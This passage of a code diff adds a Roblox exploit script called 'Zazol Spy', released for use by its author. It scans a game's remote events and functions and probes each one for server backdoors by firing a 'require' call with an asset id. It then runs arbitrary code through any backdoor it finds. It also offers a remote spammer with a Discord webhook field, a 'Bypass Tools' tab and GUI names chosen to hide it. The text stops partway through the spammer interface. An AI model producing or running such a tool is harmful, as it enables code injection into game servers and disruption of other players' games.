@@ -1,0 +1,2102 @@
+--made by zazol666 enjoy!!!
+
+
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Zazol = {}
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "CoreGui" .. math.random(1000, 9999)
+screenGui.Parent = game:GetService("CoreGui")
+screenGui.DisplayOrder = 0
+screenGui.ResetOnSpawn = false
+
+local loadingGui = Instance.new("ScreenGui")
+loadingGui.Name = "ZazolLoadingGui"
+loadingGui.IgnoreGuiInset = true
+loadingGui.Parent = game:GetService("CoreGui")
+loadingGui.DisplayOrder = 10
+loadingGui.ResetOnSpawn = false
+
+local loadingFrame = Instance.new("Frame")
+loadingFrame.Size = UDim2.new(1, 0, 1, 0)
+loadingFrame.Position = UDim2.new(0, 0, 0, 0)
+loadingFrame.BackgroundColor3 = Color3.new(0.05, 0.05, 0.05)
+loadingFrame.BackgroundTransparency = 1
+loadingFrame.Parent = loadingGui
+
+local loadingLogo = Instance.new("TextLabel")
+loadingLogo.Name = "LoadingLogo"
+loadingLogo.Text = "Zazol Spy"
+loadingLogo.Size = UDim2.new(0.3, 0, 0.1, 0)
+loadingLogo.Position = UDim2.new(0.35, 0, 0.3, 0)
+loadingLogo.BackgroundTransparency = 1
+loadingLogo.TextColor3 = Color3.new(1, 1, 1)
+loadingLogo.Font = Enum.Font.SourceSansBold
+loadingLogo.TextSize = 40
+loadingLogo.TextTransparency = 1
+loadingLogo.Parent = loadingFrame
+
+local progressFrame = Instance.new("Frame")
+progressFrame.Name = "ProgressFrame"
+progressFrame.Size = UDim2.new(0.4, 0, 0.03, 0)
+progressFrame.Position = UDim2.new(0.3, 0, 0.45, 0)
+progressFrame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+progressFrame.BackgroundTransparency = 1
+progressFrame.BorderSizePixel = 0
+progressFrame.Parent = loadingFrame
+
+local progressBar = Instance.new("Frame")
+progressBar.Name = "ProgressBar"
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+progressBar.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+progressBar.BorderSizePixel = 0
+progressBar.Parent = progressFrame
+
+local progressText = Instance.new("TextLabel")
+progressText.Name = "ProgressText"
+progressText.Text = "Initializing..."
+progressText.Size = UDim2.new(0.4, 0, 0.05, 0)
+progressText.Position = UDim2.new(0.3, 0, 0.5, 0)
+progressText.BackgroundTransparency = 1
+progressText.TextColor3 = Color3.new(1, 1, 1)
+progressText.Font = Enum.Font.SourceSans
+progressText.TextSize = 20
+progressText.TextTransparency = 1
+progressText.Parent = loadingFrame
+
+function Zazol.ShowNotification(message, isSuccess)
+    local notification = Instance.new("Frame")
+    notification.Name = "SysNotification"
+    notification.Size = UDim2.new(0.4, 0, 0.1, 0)
+    notification.Position = UDim2.new(0.3, 0, 1.2, 0)
+    notification.BackgroundColor3 = isSuccess and Color3.new(0.2, 0.8, 0.2) or Color3.new(0.8, 0.2, 0.2)
+    notification.BackgroundTransparency = 0.2
+    notification.BorderSizePixel = 0
+    notification.Parent = screenGui
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 15)
+    corner.Parent = notification
+
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Name = "SysText"
+    textLabel.Text = message
+    textLabel.Size = UDim2.new(1, -40, 1, 0)
+    textLabel.Position = UDim2.new(0, 40, 0, 0)
+    textLabel.BackgroundTransparency = 1
+    textLabel.TextColor3 = Color3.new(1, 1, 1)
+    textLabel.Font = Enum.Font.SourceSansBold
+    textLabel.TextSize = 18
+    textLabel.Parent = notification
+
+    local icon = Instance.new("TextLabel")
+    icon.Name = "SysIcon"
+    icon.Text = isSuccess and "✅" or "❌"
+    icon.Size = UDim2.new(0, 30, 1, 0)
+    icon.Position = UDim2.new(0, 5, 0, 0)
+    icon.BackgroundTransparency = 1
+    icon.TextColor3 = Color3.new(1, 1, 1)
+    icon.Font = Enum.Font.SourceSansBold
+    icon.TextSize = 24
+    icon.Parent = notification
+
+    game:GetService("TweenService"):Create(notification, TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Position = UDim2.new(0.3, 0, 0.8, 0)
+    }):Play()
+
+    task.wait(4)
+    game:GetService("TweenService"):Create(notification, TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+        Position = UDim2.new(0.3, 0, 1.2, 0),
+        BackgroundTransparency = 1
+    }):Play()
+
+    task.wait(0.7)
+    notification:Destroy()
+end
+
+local function fadeInLoadingScreen()
+    TweenService:Create(loadingFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        BackgroundTransparency = 0
+    }):Play()
+    TweenService:Create(loadingLogo, TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        TextTransparency = 0
+    }):Play()
+    TweenService:Create(progressFrame, TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        BackgroundTransparency = 0
+    }):Play()
+    TweenService:Create(progressText, TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        TextTransparency = 0
+    }):Play()
+end
+
+local function updateProgress(progress, statusText)
+    progressText.Text = statusText
+    TweenService:Create(progressBar, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Size = UDim2.new(progress, 0, 1, 0)
+    }):Play()
+end
+
+local function createMainGui()
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "SystemFrame"
+    mainFrame.Size = UDim2.new(0.4, 0, 0.6, 0)
+    mainFrame.Position = UDim2.new(0.3, 0, 0.2, 0)
+    mainFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Active = true
+    mainFrame.Draggable = true
+    mainFrame.Parent = screenGui
+
+    local shadow = Instance.new("ImageLabel")
+    shadow.Name = "SysShadow"
+    shadow.Size = UDim2.new(1, 10, 1, 10)
+    shadow.Position = UDim2.new(0, -5, 0, -5)
+    shadow.BackgroundTransparency = 1
+    shadow.Image = "rbxassetid://1316045217"
+    shadow.ImageColor3 = Color3.new(0, 0, 0)
+    shadow.ScaleType = Enum.ScaleType.Slice
+    shadow.SliceCenter = Rect.new(10, 10, 118, 118)
+    shadow.Parent = mainFrame
+
+    local title = Instance.new("TextLabel")
+    title.Name = "SysTitle"
+    title.Text = "Zazol Spy"
+    title.Size = UDim2.new(1, 0, 0.1, 0)
+    title.Position = UDim2.new(0, 0, 0, 0)
+    title.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+    title.TextColor3 = Color3.new(1, 1, 1)
+    title.Font = Enum.Font.SourceSansBold
+    title.TextSize = 18
+    title.BorderSizePixel = 0
+    title.Parent = mainFrame
+
+    local tabFrame = Instance.new("Frame")
+    tabFrame.Name = "SysTabFrame"
+    tabFrame.Size = UDim2.new(1, 0, 0.05, 0)
+    tabFrame.Position = UDim2.new(0, 0, 0.1, 0)
+    tabFrame.BackgroundTransparency = 1
+    tabFrame.Parent = mainFrame
+
+    local remoteSpammerTab = Instance.new("TextButton")
+    remoteSpammerTab.Name = "SysRemoteSpammerTab"
+    remoteSpammerTab.Text = "Remote Spammer"
+    remoteSpammerTab.Size = UDim2.new(0.2, 0, 1, 0)
+    remoteSpammerTab.Position = UDim2.new(0, 0, 0, 0)
+    remoteSpammerTab.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+    remoteSpammerTab.TextColor3 = Color3.new(1, 1, 1)
+    remoteSpammerTab.Font = Enum.Font.SourceSansBold
+    remoteSpammerTab.TextSize = 14
+    remoteSpammerTab.BorderSizePixel = 0
+    remoteSpammerTab.AutoButtonColor = true
+    remoteSpammerTab.Parent = tabFrame
+
+    local remoteTab = Instance.new("TextButton")
+    remoteTab.Name = "SysRemoteTab"
+    remoteTab.Text = "Remote Events"
+    remoteTab.Size = UDim2.new(0.2, 0, 1, 0)
+    remoteTab.Position = UDim2.new(0.2, 0, 0, 0)
+    remoteTab.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+    remoteTab.TextColor3 = Color3.new(1, 1, 1)
+    remoteTab.Font = Enum.Font.SourceSansBold
+    remoteTab.TextSize = 14
+    remoteTab.BorderSizePixel = 0
+    remoteTab.AutoButtonColor = true
+    remoteTab.Parent = tabFrame
+	
+	
+
+
+    local remoteFuncTab = Instance.new("TextButton")
+    remoteFuncTab.Name = "SysRemoteFuncTab"
+    remoteFuncTab.Text = "Remote Functions"
+    remoteFuncTab.Size = UDim2.new(0.2, 0, 1, 0)
+    remoteFuncTab.Position = UDim2.new(0.4, 0, 0, 0)
+    remoteFuncTab.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+    remoteFuncTab.TextColor3 = Color3.new(1, 1, 1)
+    remoteFuncTab.Font = Enum.Font.SourceSansBold
+    remoteFuncTab.TextSize = 14
+    remoteFuncTab.BorderSizePixel = 0
+    remoteFuncTab.AutoButtonColor = true
+    remoteFuncTab.Parent = tabFrame
+
+    local bypassTab = Instance.new("TextButton")
+    bypassTab.Name = "SysBypassTab"
+    bypassTab.Text = "Bypass Tools"
+    bypassTab.Size = UDim2.new(0.2, 0, 1, 0)
+    bypassTab.Position = UDim2.new(0.6, 0, 0, 0)
+    bypassTab.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+    bypassTab.TextColor3 = Color3.new(1, 1, 1)
+    bypassTab.Font = Enum.Font.SourceSansBold
+    bypassTab.TextSize = 14
+    bypassTab.BorderSizePixel = 0
+    bypassTab.AutoButtonColor = true
+    bypassTab.Parent = tabFrame
+
+    local exploitCheckTab = Instance.new("TextButton")
+    exploitCheckTab.Name = "SysExploitCheckTab"
+    exploitCheckTab.Text = "Exploit Check(Soon)"
+    exploitCheckTab.Size = UDim2.new(0.2, 0, 1, 0)
+    exploitCheckTab.Position = UDim2.new(0.8, 0, 0, 0)
+    exploitCheckTab.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+    exploitCheckTab.TextColor3 = Color3.new(1, 1, 1)
+    exploitCheckTab.Font = Enum.Font.SourceSansBold
+    exploitCheckTab.TextSize = 14
+    exploitCheckTab.BorderSizePixel = 0
+    exploitCheckTab.AutoButtonColor = true
+    exploitCheckTab.Parent = tabFrame
+
+    local scrollFrame = Instance.new("ScrollingFrame")
+    scrollFrame.Name = "SysScrollFrame"
+    scrollFrame.Size = UDim2.new(1, 0, 0.85, 0)
+    scrollFrame.Position = UDim2.new(0, 0, 0.15, 0)
+    scrollFrame.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
+    scrollFrame.BorderSizePixel = 0
+    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+    scrollFrame.ScrollBarThickness = 5
+    scrollFrame.ScrollBarImageColor3 = Color3.new(0.8, 0.8, 0.8)
+    scrollFrame.Parent = mainFrame
+
+    return mainFrame, remoteSpammerTab, remoteTab, remoteFuncTab, bypassTab, exploitCheckTab, scrollFrame
+end
+
+local function fadeOutLoadingScreen(callback)
+    TweenService:Create(loadingFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+        BackgroundTransparency = 1
+    }):Play()
+    TweenService:Create(loadingLogo, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+        TextTransparency = 1
+    }):Play()
+    TweenService:Create(progressFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+        BackgroundTransparency = 1
+    }):Play()
+    TweenService:Create(progressText, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+        TextTransparency = 1
+    }):Play()
+    task.wait(0.5)
+    loadingGui:Destroy()
+    if callback then callback() end
+end
+
+fadeInLoadingScreen()
+
+updateProgress(0.3, "Loading resources...")
+task.wait(1)
+updateProgress(0.6, "Scanning game...")
+task.wait(1)
+updateProgress(1, "Complete!")
+task.wait(1.5)
+
+local remoteEventsCache = {}
+local remoteFunctionsCache = {}
+local exploitCache = { precise = {}, potential = {} }
+local bypassCache = {}
+
+local remoteEventsScanned = false
+local remoteFunctionsScanned = false
+local exploitScanned = false
+local bypassScanned = false
+
+local remoteEventsElements = {}
+local remoteFunctionsElements = {}
+local exploitElements = {}
+local bypassElements = {}
+local remoteSpammerElements = {}
+
+fadeOutLoadingScreen(function()
+    local mainFrame, remoteSpammerTab, remoteTab, remoteFuncTab, bypassTab, exploitCheckTab, scrollFrame = createMainGui()
+    Zazol.ShowNotification("Loading complete!", true)
+
+    function Zazol.CheckRemote(remoteName)
+        local suspiciousKeywords = {"execute", "script", "hack", "exploit", "remote", "fire", "server"}
+        local dangerousKeywords = {"backdoor", "admin"}
+        local reasons = {}
+        local isSuspicious = false
+        local isDangerous = false
+
+        for _, keyword in pairs(suspiciousKeywords) do
+            if string.find(string.lower(remoteName), string.lower(keyword)) then
+                table.insert(reasons, "Contains keyword: " .. keyword)
+                isSuspicious = true
+            end
+        end
+
+        for _, keyword in pairs(dangerousKeywords) do
+            if string.find(string.lower(remoteName), string.lower(keyword)) then
+                table.insert(reasons, "Contains dangerous keyword: " .. keyword)
+                isDangerous = true
+            end
+        end
+
+        return isSuspicious, isDangerous, table.concat(reasons, ", ")
+    end
+
+    function Zazol.CheckPreciseBackdoor(remote)
+        local success, response = pcall(function()
+            if remote:IsA("RemoteEvent") then
+                remote:FireServer("require(137998585177445)")
+                return true
+            elseif remote:IsA("RemoteFunction") then
+                return remote:InvokeServer("require(137998585177445)")
+            end
+        end)
+        return success and response ~= nil
+    end
+
+    function Zazol.FindBackdoors()
+        if exploitScanned then
+            return exploitCache.precise, exploitCache.potential
+        end
+
+        exploitCache = { precise = {}, potential = {} }
+        for _, instance in pairs(game:GetDescendants()) do
+            if instance:IsA("RemoteFunction") or instance:IsA("RemoteEvent") then
+                local isSuspicious, isDangerous, reason = Zazol.CheckRemote(instance.Name)
+                if isSuspicious or isDangerous then
+                    if Zazol.CheckPreciseBackdoor(instance) then
+                        table.insert(exploitCache.precise, instance)
+                    else
+                        table.insert(exploitCache.potential, instance)
+                    end
+                end
+            end
+        end
+
+        exploitScanned = true
+        return exploitCache.precise, exploitCache.potential
+    end
+
+    function Zazol.ExecuteBackdoor(remote, code)
+        local success, errorMessage = pcall(function()
+            if remote:IsA("RemoteEvent") then
+                remote:FireServer(code)
+            elseif remote:IsA("RemoteFunction") then
+                remote:InvokeServer(code)
+            end
+        end)
+        if success then
+            Zazol.ShowNotification("Backdoor executed: " .. remote.Name, true)
+        else
+            Zazol.ShowNotification("Error: " .. errorMessage, false)
+        end
+    end
+
+    function Zazol.LogEvent(remote, args, isSuspicious, isDangerous, reason, elementsTable)
+        local eventFrame = Instance.new("Frame")
+        eventFrame.Name = "SysEventFrame"
+        eventFrame.Size = UDim2.new(1, -10, 0, 30)
+        eventFrame.Position = UDim2.new(0, 5, 0, #elementsTable * 35)
+        eventFrame.BackgroundTransparency = 1
+        eventFrame.Parent = scrollFrame
+        eventFrame.Visible = true
+
+        local icon = Instance.new("TextLabel")
+        icon.Name = "SysIcon"
+        icon.Text = isDangerous and "☢️" or isSuspicious and "⚠️" or "🔍"
+        icon.Size = UDim2.new(0, 30, 1, 0)
+        icon.Position = UDim2.new(0, 0, 0, 0)
+        icon.BackgroundTransparency = 1
+        icon.TextColor3 = Color3.new(1, 1, 1)
+        icon.Font = Enum.Font.SourceSansBold
+        icon.TextSize = 14
+        icon.Parent = eventFrame
+
+        local eventButton = Instance.new("TextButton")
+        eventButton.Name = "SysEventButton"
+        eventButton.Text = remote.Name
+        eventButton.Size = UDim2.new(0.6, -30, 1, 0)
+        eventButton.Position = UDim2.new(0, 30, 0, 0)
+        eventButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+        eventButton.TextColor3 = Color3.new(1, 1, 1)
+        eventButton.Font = Enum.Font.SourceSans
+        eventButton.TextSize = 14
+        eventButton.BorderSizePixel = 0
+        eventButton.AutoButtonColor = true
+        eventButton.Parent = eventFrame
+
+        local copyButton = Instance.new("TextButton")
+        copyButton.Name = "SysCopyButton"
+        copyButton.Text = "Copy"
+        copyButton.Size = UDim2.new(0.2, 0, 1, 0)
+        copyButton.Position = UDim2.new(0.6, 0, 0, 0)
+        copyButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+        copyButton.TextColor3 = Color3.new(1, 1, 1)
+        copyButton.Font = Enum.Font.SourceSansBold
+        copyButton.TextSize = 14
+        copyButton.BorderSizePixel = 0
+        copyButton.AutoButtonColor = true
+        copyButton.Parent = eventFrame
+
+        local actionButton = Instance.new("TextButton")
+        actionButton.Name = "SysActionButton"
+        actionButton.Text = remote:IsA("RemoteEvent") and "Trigger" or "Invoke"
+        actionButton.Size = UDim2.new(0.2, 0, 1, 0)
+        actionButton.Position = UDim2.new(0.8, 0, 0, 0)
+        actionButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+        actionButton.TextColor3 = Color3.new(1, 1, 1)
+        actionButton.Font = Enum.Font.SourceSansBold
+        actionButton.TextSize = 14
+        actionButton.BorderSizePixel = 0
+        actionButton.AutoButtonColor = true
+        actionButton.Parent = eventFrame
+
+        eventButton.MouseEnter:Connect(function()
+            game:GetService("TweenService"):Create(eventButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.new(1, 0.3, 0.3)}):Play()
+        end)
+        eventButton.MouseLeave:Connect(function()
+            game:GetService("TweenService"):Create(eventButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)}):Play()
+        end)
+
+        local detailsFrame
+        eventButton.MouseButton1Click:Connect(function()
+            if detailsFrame then
+                detailsFrame:Destroy()
+                detailsFrame = nil
+                return
+            end
+
+            detailsFrame = Instance.new("Frame")
+            detailsFrame.Name = "SysDetailsFrame"
+            detailsFrame.Size = UDim2.new(1, -10, 0, 100)
+            detailsFrame.Position = UDim2.new(0, 5, 0, eventFrame.Position.Y.Offset + 35)
+            detailsFrame.BackgroundColor3 = Color3.new(0.25, 0.25, 0.25)
+            detailsFrame.BorderSizePixel = 0
+            detailsFrame.Parent = scrollFrame
+
+            local detailsText = Instance.new("TextLabel")
+            detailsText.Name = "SysDetailsText"
+            detailsText.Text = (isDangerous and "☢️ Dangerous: " or isSuspicious and "⚠️ Suspicious: " or "🔍 Normal: ") .. 
+                reason .. 
+                "\nFull Path: " .. remote:GetFullName() .. 
+                "\nParent: " .. tostring(remote.Parent) .. 
+                "\nType: " .. (remote:IsA("RemoteEvent") and "RemoteEvent" or "RemoteFunction") .. 
+                "\nArgs: " .. tostring(args) .. 
+                "\nBackdoor Check: " .. (Zazol.CheckPreciseBackdoor(remote) and "Yes" or "No")
+            detailsText.Size = UDim2.new(1, 0, 1, 0)
+            detailsText.Position = UDim2.new(0, 0, 0, 0)
+            detailsText.BackgroundTransparency = 1
+            detailsText.TextColor3 = Color3.new(1, 1, 1)
+            detailsText.Font = Enum.Font.SourceSans
+            detailsText.TextSize = 12
+            detailsText.TextXAlignment = Enum.TextXAlignment.Left
+            detailsText.TextYAlignment = Enum.TextYAlignment.Top
+            detailsText.Parent = detailsFrame
+
+            local copyDetailsButton = Instance.new("TextButton")
+            copyDetailsButton.Name = "SysCopyDetailsButton"
+            copyDetailsButton.Text = "Copy Details"
+            copyDetailsButton.Size = UDim2.new(0.2, 0, 0, 20)
+            copyDetailsButton.Position = UDim2.new(0.8, 0, 0.8, 0)
+            copyDetailsButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+            copyDetailsButton.TextColor3 = Color3.new(1, 1, 1)
+            copyDetailsButton.Font = Enum.Font.SourceSansBold
+            copyDetailsButton.TextSize = 12
+            copyDetailsButton.BorderSizePixel = 0
+            copyDetailsButton.AutoButtonColor = true
+            copyDetailsButton.Parent = detailsFrame
+
+            copyDetailsButton.MouseButton1Click:Connect(function()
+                pcall(function()
+                    setclipboard(detailsText.Text)
+                    Zazol.ShowNotification("Event details copied to clipboard.", true)
+                end)
+            end)
+
+            scrollFrame.CanvasSize = UDim2.new(0, 0, 0, #elementsTable * 35 + 100)
+        end)
+
+        copyButton.MouseButton1Click:Connect(function()
+            local path = "game." .. remote:GetFullName()
+            pcall(function()
+                setclipboard(path)
+                Zazol.ShowNotification("Copied to clipboard: " .. path, true)
+            end)
+        end)
+
+        actionButton.MouseButton1Click:Connect(function()
+            local inputBox = Instance.new("TextBox")
+            inputBox.Name = "SysInputBox"
+            inputBox.Size = UDim2.new(0.8, -30, 1, 0)
+            inputBox.Position = UDim2.new(0, 30, 0, 0)
+            inputBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+            inputBox.TextColor3 = Color3.new(1, 1, 1)
+            inputBox.Font = Enum.Font.SourceSans
+            inputBox.TextSize = 14
+            inputBox.PlaceholderText = "e.g., 'test', 123"
+            inputBox.Text = ""
+            inputBox.Parent = eventFrame
+
+            local submitButton = Instance.new("TextButton")
+            submitButton.Name = "SysSubmitButton"
+            submitButton.Text = "Submit"
+            submitButton.Size = UDim2.new(0.2, 0, 1, 0)
+            submitButton.Position = UDim2.new(0.8, 0, 0, 0)
+            submitButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+            submitButton.TextColor3 = Color3.new(1, 1, 1)
+            submitButton.Font = Enum.Font.SourceSansBold
+            submitButton.TextSize = 14
+            submitButton.BorderSizePixel = 0
+            submitButton.AutoButtonColor = true
+            submitButton.Parent = eventFrame
+
+            submitButton.MouseButton1Click:Connect(function()
+                local args = inputBox.Text
+                if args and args ~= "" then
+                    local success, errorMessage = pcall(function()
+                        if remote:IsA("RemoteEvent") then
+                            remote:FireServer(args)
+                        else
+                            remote:InvokeServer(args)
+                        end
+                    end)
+                    if success then
+                        Zazol.ShowNotification("Remote " .. (remote:IsA("RemoteEvent") and "Event" or "Function") .. " triggered: " .. remote.Name, true)
+                    else
+                        Zazol.ShowNotification("Error: " .. errorMessage, false)
+                    end
+                else
+                    Zazol.ShowNotification("Error: Please enter arguments.", false)
+                end
+                inputBox:Destroy()
+                submitButton:Destroy()
+                actionButton.Visible = true
+            end)
+            actionButton.Visible = false
+        end)
+
+        table.insert(elementsTable, eventFrame)
+        scrollFrame.CanvasSize = UDim2.new(0, 0, 0, #elementsTable * 35)
+    end
+
+    function Zazol.FindRemoteEvents()
+        if remoteEventsScanned then
+            return remoteEventsCache
+        end
+
+        local locations = {
+            game:GetService("ReplicatedStorage"),
+            game:GetService("ServerScriptService"),
+            game:GetService("ServerStorage"),
+            game:GetService("Workspace"),
+            game:GetService("RobloxReplicatedStorage")
+        }
+
+        remoteEventsCache = {}
+        for _, location in pairs(locations) do
+            for _, remote in pairs(location:GetDescendants()) do
+                if remote:IsA("RemoteEvent") then
+                    local isSuspicious, isDangerous, reason = Zazol.CheckRemote(remote.Name)
+                    table.insert(remoteEventsCache, {remote = remote, location = location.Name, isSuspicious = isSuspicious, isDangerous = isDangerous, reason = reason})
+                end
+            end
+        end
+
+        remoteEventsScanned = true
+        return remoteEventsCache
+    end
+
+    function Zazol.FindRemoteFunctions()
+        if remoteFunctionsScanned then
+            return remoteFunctionsCache
+        end
+
+        local locations = {
+            game:GetService("ReplicatedStorage"),
+            game:GetService("ServerScriptService"),
+            game:GetService("ServerStorage"),
+            game:GetService("Workspace"),
+            game:GetService("RobloxReplicatedStorage")
+        }
+
+        remoteFunctionsCache = {}
+        for _, location in pairs(locations) do
+            for _, remote in pairs(location:GetDescendants()) do
+                if remote:IsA("RemoteFunction") then
+                    local isSuspicious, isDangerous, reason = Zazol.CheckRemote(remote.Name)
+                    table.insert(remoteFunctionsCache, {remote = remote, location = location.Name, isSuspicious = isSuspicious, isDangerous = isDangerous, reason = reason})
+                end
+            end
+        end
+
+        remoteFunctionsScanned = true
+        return remoteFunctionsCache
+    end
+
+    local function setActiveTab(tab)
+        for _, t in pairs(mainFrame:FindFirstChild("SysTabFrame"):GetChildren()) do
+            if t:IsA("TextButton") then
+                t.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+            end
+        end
+        tab.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
+    end
+
+    local function hideAllTabs()
+        for _, element in pairs(remoteEventsElements) do
+            element.Visible = false
+        end
+        for _, element in pairs(remoteFunctionsElements) do
+            element.Visible = false
+        end
+        for _, element in pairs(exploitElements) do
+            element.Visible = false
+        end
+        for _, element in pairs(bypassElements) do
+            element.Visible = false
+        end
+        for _, element in pairs(remoteSpammerElements) do
+            element.Visible = false
+        end
+    end
+
+    local isSpamming = false
+    remoteSpammerTab.MouseButton1Click:Connect(function()
+        hideAllTabs()
+        setActiveTab(remoteSpammerTab)
+
+        if #remoteSpammerElements == 0 then
+            local webhookInput = Instance.new("TextBox")
+            webhookInput.Name = "SysWebhookInput"
+            webhookInput.PlaceholderText = "e.g., https://discord.com/api/webhooks/..."
+            webhookInput.Text = ""
+            webhookInput.Size = UDim2.new(1, -10, 0, 30)
+            webhookInput.Position = UDim2.new(0, 5, 0, 0)
+            webhookInput.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+            webhookInput.TextColor3 = Color3.new(1, 1, 1)
+            webhookInput.Font = Enum.Font.SourceSans
+            webhookInput.TextSize = 14
+            webhookInput.BorderSizePixel = 0
+            webhookInput.Parent = scrollFrame
+            webhookInput.Visible = true
+            table.insert(remoteSpammerElements, webhookInput)
+
+            local remoteInput = Instance.new("TextBox")
+            remoteInput.Name = "SysRemoteInput"
+            remoteInput.PlaceholderText = "e.g., game.ReplicatedStorage.RemoteEvent"
+            remoteInput.Text = ""
+            remoteInput.Size = UDim2.new(1, -10, 0, 30)
+            remoteInput.Position = UDim2.new(0, 5, 0, 35)
+            remoteInput.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+            remoteInput.TextColor3 = Color3.new(1, 1, 1)
+            remoteInput.Font = Enum.Font.SourceSans
+            remoteInput.TextSize = 14
+            remoteInput.BorderSizePixel = 0
+            remoteInput.Parent = scrollFrame
+            remoteInput.Visible = true
+            table.insert(remoteSpammerElements, remoteInput)
+
+            local argsInput = Instance.new("TextBox")
+            argsInput.Name = "SysArgsInput"
+            argsInput.PlaceholderText = "e.g., 'test', 123"
+            argsInput.Text = ""
+            argsInput.Size = UDim2.new(1, -10, 0, 30)
+            argsInput.Position = UDim2.new(0, 5, 0, 70)
+            argsInput.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+            argsInput.TextColor3 = Color3.new(1, 1, 1)
+            argsInput.Font = Enum.Font.SourceSans
+            argsInput.TextSize = 14
+            argsInput.BorderSizePixel = 0
+            argsInput.Parent = scrollFrame
+            argsInput.Visible = true
+            table.insert(remoteSpammerElements, argsInput)
+
+            local delayFrame = Instance.new("Frame")
+            delayFrame.Name = "SysDelayFrame"
+            delayFrame.Size = UDim2.new(1, -10, 0, 30)
+            delayFrame.Position = UDim2.new(0, 5, 0, 105)
+            delayFrame.BackgroundTransparency = 1
+            delayFrame.Parent = scrollFrame
+            delayFrame.Visible = true
+            table.insert(remoteSpammerElements, delayFrame)
+
+            local delayLabel = Instance.new("TextLabel")
+            delayLabel.Name = "SysDelayLabel"
+            delayLabel.Text = "Delay: 0.5s"
+            delayLabel.Size = UDim2.new(0.3, 0, 1, 0)
+            delayLabel.Position = UDim2.new(0, 0, 0, 0)
+            delayLabel.BackgroundTransparency = 1
+            delayLabel.TextColor3 = Color3.new(1, 1, 1)
+            delayLabel.Font = Enum.Font.SourceSans
+            delayLabel.TextSize = 14
+            delayLabel.TextXAlignment = Enum.TextXAlignment.Left
+            delayLabel.Parent = delayFrame
+
+            local delaySlider = Instance.new("TextButton")
+            delaySlider.Name = "SysDelaySlider"
+            delaySlider.Size = UDim2.new(0.7, -10, 0, 10)
+            delaySlider.Position = UDim2.new(0.3, 5, 0, 10)
+            delaySlider.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
+            delaySlider.Text = ""
+            delaySlider.BorderSizePixel = 0
+            delaySlider.Parent = delayFrame
+
+            local sliderKnob = Instance.new("TextButton")
+            sliderKnob.Name = "SysSliderKnob"
+            sliderKnob.Size = UDim2.new(0, 10, 0, 20)
+            sliderKnob.Position = UDim2.new(0.5, -5, 0, -5)
+            sliderKnob.BackgroundColor3 = Color3.new(0.8, 0.8, 0.8)
+            sliderKnob.Text = ""
+            sliderKnob.BorderSizePixel = 0
+            sliderKnob.Parent = delaySlider
+
+            local startButton = Instance.new("TextButton")
+            startButton.Name = "SysStartButton"
+            startButton.Text = "Start Spamming"
+            startButton.Size = UDim2.new(0.5, -10, 0, 30)
+            startButton.Position = UDim2.new(0, 5, 0, 140)
+            startButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+            startButton.TextColor3 = Color3.new(1, 1, 1)
+            startButton.Font = Enum.Font.SourceSansBold
+            startButton.TextSize = 14
+            startButton.BorderSizePixel = 0
+            startButton.AutoButtonColor = true
+            startButton.Parent = scrollFrame
+            startButton.Visible = true
+            table.insert(remoteSpammerElements, startButton)
+
+            local stopButton = Instance.new("TextButton")
+            stopButton.Name = "SysStopButton"
+            stopButton.Text = "Stop Spamming"
+            stopButton.Size = UDim2.new(0.5, -10, 0, 30)
+            stopButton.Position = UDim2.new(0.5, 5, 0, 140)
+            stopButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+            stopButton.TextColor3 = Color3.new(1, 1, 1)
+            stopButton.Font = Enum.Font.SourceSansBold
+            stopButton.TextSize = 14
+            stopButton.BorderSizePixel = 0
+            stopButton.AutoButtonColor = true
